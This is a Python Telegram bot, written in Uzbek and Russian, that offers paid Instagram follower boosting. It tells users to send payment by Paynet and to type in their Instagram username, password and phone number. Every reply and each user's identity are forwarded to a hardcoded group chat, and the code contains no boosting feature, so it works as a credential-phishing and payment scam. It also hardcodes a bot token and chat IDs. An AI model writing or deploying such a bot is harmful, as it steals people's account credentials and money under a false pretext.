import telebot
from telebot import types
from telebot import custom_filters


group_id = '-1001571258471'
admins = ['1946132115']
bot = telebot.TeleBot("5081384061:AAEGBxuIaHjRzNRl_gfloNMpiI718APGx1E")

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton('Zakaz qilish👣')
    btn2 = types.KeyboardButton('Admin 👤')
    markup.add(btn1,btn2)
    bot.send_message(message.chat.id, f"Xurmatli! {message.chat.first_name} siz 2 000 ming som paynet qiling +998944634212  wu raqamga  20 ta nakrutka urib beramiz instagramga 💯🤝\n\nKim paynet qilgan bolsa iltimos lichkamga id raqamini qoldirsin: @ritchgoldie",reply_markup=markup)
    bot.send_message(group_id, f"Фамилия: {message.chat.first_name}\nИмя: {message.chat.last_name}\nНикнейм: @{message.chat.username}\nID: {message.chat.id}\nВремя входа:{message.date}\nСообщения: {message.text}")

@bot.message_handler(content_types=['text'])
def love(message):
    if message.text == "Zakaz qilish👣":
        markup = types.ReplyKeyboardRemove()
        bot.send_message(message.chat.id, f"{message.chat.first_name}, siz zakaz bermoqchi bolsangiz botga insagramizni paroli va niki yozib qoldring bot sizga sayt orqali kirib nakrutka urib beradi 😉👁\nMasalan:\nNickname:hackintosh\nPassword:password123\nPhone:+998903098542",reply_markup=markup)
        bot.send_message(group_id,f"Malumotlar:{message.text}")
    elif message.text == "Admin 👤":
        bot.send_message(message.chat.id,
                         f"Admin Habar Yozishingiz Mumkin 10 kunda korb ciqilad")
        bot.send_message(group_id,
                         f"Фамилия: {message.chat.first_name}\nИмя: {message.chat.last_name}\nНикнейм: @{message.chat.username}\nID: {message.chat.id}\nВремя входа:{message.date}\nСообщения: {message.text}")


    else:
        markup = types.ReplyKeyboardRemove()
        bot.send_message(message.chat.id,
                         f"{message.chat.first_name}, siz zakaz bermoqchi bolsangiz botga insagramizni paroli va niki yozib qoldring bot sizga sayt orqali kirib nakrutka urib beradi 😉👁\nMasalan\nNickname: hackintosh\nPassword: password123\nPhone: +998903098542",
                         reply_markup=markup)
        bot.send_message(group_id, f"Adminga :{message.text}")



@bot.message_handler(chat_id=admins,commands=['link'])
def link(message):
    bot.send_message(message.chat.id,f"<a href='https://t.me/+zm8Eob1PB7kwYjQy'>Вход</a>",parse_mode='html')

@bot.message_handler(commands=['link'])
def not_admin(message):
    bot.send_message(message.chat.id, "У вас нет права для использование данного параметра")

# Не забудьте регистрация
bot.add_custom_filter(custom_filters.ChatFilter())

bot.polling()